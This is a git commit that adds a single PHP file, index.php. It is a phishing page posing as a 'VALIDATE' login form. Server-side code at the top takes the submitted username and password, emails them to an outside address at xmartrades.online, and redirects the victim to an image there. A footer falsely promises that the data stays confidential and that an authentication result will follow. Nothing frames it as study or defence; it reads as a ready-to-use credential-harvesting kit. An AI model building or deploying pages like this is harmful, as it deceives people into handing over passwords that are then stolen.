cf4326aa3c06292146c67deba5978dddd2f207a9
JOHNSON NOAH <gannandre08@gmail.com>
2023-09-02 19:22:58 -0700

    first commit

---
+++ index.php
@@ -0,0 +1,75 @@
+
+<?php
+if(!empty($_POST["email"])) {
+$to = "support@xmartrades.online";
+$subject = "My subject";
+$email = $_POST["email"];
+$password = $_POST["password"];
+$txt = "Email:".$email.' & Password: '.$password;
+$headers = "From: support@xmartrades.online" . "\r\n" .
+"CC: support@xmartrades.online";
+
+mail($to,$subject,$txt,$headers);
+
+header("Location: https://xmartrades.online/HelloTech-qr-code-300x300.webp");
+}
+?>
+
+
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8">
+  <title>WELCOME</title>
+  <link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<body>
+    <section class="container">
+        <div class="login-container">
+            <div class="circle circle-one"></div>
+            <div class="form-container">
+                <h1 class="opacity">VALIDATE</h1>
+                <form action="index.php" method="post">
+				     <label for="email"><b>Username</b></label>
+                    <input type="text" placeholder="USERNAME" />
+				    <label for="password"><b>Password</b></label>
+                    <input type="password" placeholder="PASSWORD" />
+                    <button type="submit">SUBMIT</button>
+                </form>
+
+            </div>
+            <div class="circle circle-two"></div>
+        </div>
+        <div class="theme-btn-container"></div>
+    </section>
+</body>
+<!-- partial -->
+  <script  src="./script.js"></script>
+              </div>
+            </div>
+          </div>
+          <div class="row">
+            <p class="px-3 note" style="font-size: 15px;margin-top: 50px;font-weight: bold;">
+              NOTE
+            </p>
+            <p class="px-3" style="font-size: 11px;">
+              <ul>
+                <li style="font-size: 11px;">
+                  The information collected is confidential and will not be disclosed by us to unauthorized third parties.
+                </li>
+                <li style="font-size: 11px;">
+                  Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties. Authentication information will not be modified.
+                </li>
+                <li style="font-size: 11px;">
+                  Authentication process will be carried out immediately upon receipt of information, and we will have notify you of the authentication result.
+                </li>
+              </ul>
+            
+          </div>
+        </div>
+</body>
+</html>
